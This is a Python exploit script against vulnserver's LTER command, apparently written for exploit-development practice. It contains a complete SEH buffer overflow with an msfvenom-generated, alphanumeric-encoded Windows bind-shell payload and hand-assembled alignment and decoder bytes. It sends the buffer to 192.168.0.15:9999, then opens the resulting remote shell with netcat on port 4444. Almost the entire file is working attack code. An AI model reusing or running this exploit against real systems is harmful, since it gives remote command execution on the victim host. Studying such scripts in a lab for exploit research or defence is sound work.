import time
import socket
import subprocess

'''
Notes:
======
- Bad characters are everything beyond '\x7f' and obviously '\x00'
- Bad character '\xff' get converted to '\x80' by vulnserver, which will use for the backward jump ;)
- Manual shellcoding is required to jump to the start of shellcode
- Used Slink alphanumeric encoder found in https://github.com/ihack4falafel/Slink, whomever made this tool must be 1337 ;)
'''

#root@kali:~# msfvenom -p windows/shell_bind_tcp -b '\x00' -e x86/alpha_mixed BufferRegister=ESI -f python -v shellcode 
#Payload size: 710 bytes
shellcode =  ""
shellcode += "\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x49\x6c\x68\x68\x4b\x32\x77\x70"
shellcode += "\x37\x70\x53\x30\x45\x30\x6d\x59\x59\x75\x70\x31"
shellcode += "\x79\x50\x53\x54\x6e\x6b\x72\x70\x46\x50\x4c\x4b"
shellcode += "\x30\x52\x66\x6c\x4c\x4b\x53\x62\x54\x54\x4c\x4b"
shellcode += "\x50\x72\x67\x58\x76\x6f\x58\x37\x63\x7a\x76\x46"
shellcode += "\x34\x71\x69\x6f\x4e\x4c\x67\x4c\x55\x31\x53\x4c"
shellcode += "\x56\x62\x46\x4c\x75\x70\x4f\x31\x58\x4f\x44\x4d"
shellcode += "\x46\x61\x49\x57\x6a\x42\x78\x72\x33\x62\x72\x77"
shellcode += "\x4e\x6b\x73\x62\x34\x50\x4e\x6b\x43\x7a\x77\x4c"
shellcode += "\x4c\x4b\x32\x6c\x74\x51\x53\x48\x59\x73\x30\x48"
shellcode += "\x63\x31\x4b\x61\x52\x71\x4c\x4b\x50\x59\x61\x30"
shellcode += "\x66\x61\x7a\x73\x6c\x4b\x50\x49\x65\x48\x38\x63"
shellcode += "\x57\x4a\x63\x79\x4e\x6b\x64\x74\x6e\x6b\x73\x31"
shellcode += "\x68\x56\x45\x61\x49\x6f\x6c\x6c\x5a\x61\x78\x4f"
shellcode += "\x46\x6d\x37\x71\x69\x57\x75\x68\x4d\x30\x63\x45"
shellcode += "\x69\x66\x33\x33\x31\x6d\x49\x68\x67\x4b\x43\x4d"
shellcode += "\x35\x74\x44\x35\x48\x64\x52\x78\x6c\x4b\x56\x38"
shellcode += "\x34\x64\x57\x71\x4e\x33\x65\x36\x6e\x6b\x36\x6c"
shellcode += "\x32\x6b\x6c\x4b\x70\x58\x35\x4c\x53\x31\x5a\x73"
shellcode += "\x6e\x6b\x46\x64\x4c\x4b\x63\x31\x4a\x70\x4f\x79"
shellcode += "\x70\x44\x66\x44\x55\x74\x43\x6b\x43\x6b\x53\x51"
shellcode += "\x31\x49\x31\x4a\x50\x51\x39\x6f\x79\x70\x73\x6f"
shellcode += "\x53\x6f\x62\x7a\x6e\x6b\x32\x32\x48\x6b\x6c\x4d"
shellcode += "\x31\x4d\x50\x68\x76\x53\x57\x42\x63\x30\x63\x30"
shellcode += "\x32\x48\x71\x67\x62\x53\x67\x42\x63\x6f\x32\x74"
shellcode += "\x35\x38\x42\x6c\x52\x57\x64\x66\x34\x47\x79\x6f"
shellcode += "\x38\x55\x58\x38\x6c\x50\x36\x61\x53\x30\x55\x50"
shellcode += "\x66\x49\x58\x44\x32\x74\x36\x30\x55\x38\x35\x79"
shellcode += "\x4d\x50\x42\x4b\x37\x70\x69\x6f\x49\x45\x61\x7a"
shellcode += "\x64\x48\x56\x39\x66\x30\x59\x72\x69\x6d\x71\x50"
shellcode += "\x30\x50\x37\x30\x46\x30\x35\x38\x4b\x5a\x54\x4f"
shellcode += "\x59\x4f\x49\x70\x59\x6f\x7a\x75\x4d\x47\x73\x58"
shellcode += "\x54\x42\x67\x70\x32\x31\x71\x4c\x6c\x49\x79\x76"
shellcode += "\x52\x4a\x44\x50\x32\x76\x72\x77\x72\x48\x59\x52"
shellcode += "\x69\x4b\x67\x47\x31\x77\x39\x6f\x59\x45\x30\x57"
shellcode += "\x73\x58\x78\x37\x6a\x49\x54\x78\x69\x6f\x59\x6f"
shellcode += "\x68\x55\x32\x77\x70\x68\x53\x44\x4a\x4c\x57\x4b"
shellcode += "\x68\x61\x4b\x4f\x4e\x35\x33\x67\x4a\x37\x63\x58"
shellcode += "\x50\x75\x52\x4e\x62\x6d\x51\x71\x79\x6f\x6e\x35"
shellcode += "\x53\x58\x50\x63\x62\x4d\x63\x54\x73\x30\x4f\x79"
shellcode += "\x69\x73\x31\x47\x43\x67\x52\x77\x36\x51\x48\x76"
shellcode += "\x43\x5a\x56\x72\x51\x49\x31\x46\x7a\x42\x6b\x4d"
shellcode += "\x30\x66\x6f\x37\x73\x74\x74\x64\x77\x4c\x56\x61"
shellcode += "\x47\x71\x4e\x6d\x62\x64\x76\x44\x44\x50\x79\x56"
shellcode += "\x63\x30\x32\x64\x61\x44\x42\x70\x66\x36\x31\x46"
shellcode += "\x36\x36\x42\x66\x30\x56\x30\x4e\x70\x56\x53\x66"
shellcode += "\x63\x63\x62\x76\x42\x48\x62\x59\x38\x4c\x67\x4f"
shellcode += "\x6d\x56\x39\x6f\x6a\x75\x6d\x59\x59\x70\x42\x6e"
shellcode += "\x71\x46\x30\x46\x4b\x4f\x34\x70\x75\x38\x76\x68"
shellcode += "\x4c\x47\x67\x6d\x53\x50\x4b\x4f\x7a\x75\x6d\x6b"
shellcode += "\x58\x70\x38\x35\x4d\x72\x43\x66\x35\x38\x6c\x66"
shellcode += "\x6a\x35\x4f\x4d\x4d\x4d\x6b\x4f\x79\x45\x77\x4c"
shellcode += "\x43\x36\x63\x4c\x46\x6a\x4f\x70\x69\x6b\x4d\x30"
shellcode += "\x71\x65\x54\x45\x4f\x4b\x73\x77\x47\x63\x51\x62"
shellcode += "\x70\x6f\x30\x6a\x33\x30\x66\x33\x69\x6f\x39\x45"
shellcode += "\x41\x41"

buffer  = 'LTER /.:/'
buffer += shellcode
buffer += '\x41' * (3495-124-len(shellcode))
buffer += '\x54'                          # PUSH ESP                     * point esp to where we want the encoder to dump otherwise bad shellcode
buffer += '\x58'                          # POP EAX
buffer += '\x05\x55\x11\x11\x11'          # ADD EAX,11111155
buffer += '\x05\x55\x11\x11\x11'          # ADD EAX,11111155
buffer += '\x2D\x25\x11\x22\x22'          # SUB EAX,22221125
buffer += '\x54'                          # PUSH ESP                     * save esp to esi before encoder alignement 
buffer += '\x5E'                          # POP ESI
buffer += '\x50'                          # PUSH EAX
buffer += '\x5c'                          # pop esp                      
buffer += "\x25\x4A\x4D\x4E\x55"          ## and  eax, 0x554e4d4a        * after the encoder is done we will end up with the following code
buffer += "\x25\x35\x32\x31\x2A"          ## and  eax, 0x2a313235          8BE6             MOV ESP,ESI   # restore ESP
buffer += "\x05\x77\x63\x41\x41"          ## add  eax, 0x41416377          81C6 E5030000    ADD ESI,3E5   # add offset to shellcode form ESP to ESI
buffer += "\x05\x66\x53\x41\x41"          ## add  eax, 0x41415366          FFE6             JMP ESI       # jump to ESI
buffer += "\x05\x55\x63\x41\x41"          ## add  eax, 0x41416355
buffer += "\x2D\x33\x33\x33\x33"          ## sub  eax, 0x33333333
buffer += "\x50"                          ## push eax
buffer += "\x25\x4A\x4D\x4E\x55"          ## and  eax, 0x554e4d4a
buffer += "\x25\x35\x32\x31\x2A"          ## and  eax, 0x2a313235
buffer += "\x05\x63\x12\x11\x11"          ## add  eax, 0x11111263
buffer += "\x05\x53\x12\x11\x11"          ## add  eax, 0x11111253
buffer += "\x05\x62\x12\x11\x11"          ## add  eax, 0x11111262
buffer += "\x2D\x33\x33\x33\x33"          ## sub  eax, 0x33333333
buffer += "\x50"                          ## push eax
buffer += "\x25\x4A\x4D\x4E\x55"          ## and  eax, 0x554e4d4a
buffer += "\x25\x35\x32\x31\x2A"          ## and  eax, 0x2a313235
buffer += "\x05\x46\x73\x41\x63"          ## add  eax, 0x63417346
buffer += "\x05\x45\x73\x40\x63"          ## add  eax, 0x63407345
buffer += "\x50"                          ## push eax
buffer += '\x41' * (124-73-31)            # backward jump buffer space
buffer += '\x75\xff\x74\xff'              # nSEH | jump backwards (always true)
buffer += '\x2b\x17\x50\x62'              # SEH  | 6250172B pop,pop,retn - clean address
buffer += '\x41' * (5000-9-3495-4-4)      # junk

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.0.15', 9999))
	print '[+] Sending %s bytes of evil buffer..' %len(buffer)
	s.send(buffer)
	time.sleep(5)
	subprocess.call(['nc -nv 192.168.0.15 4444'], shell=True)
except Exception as e:
	print e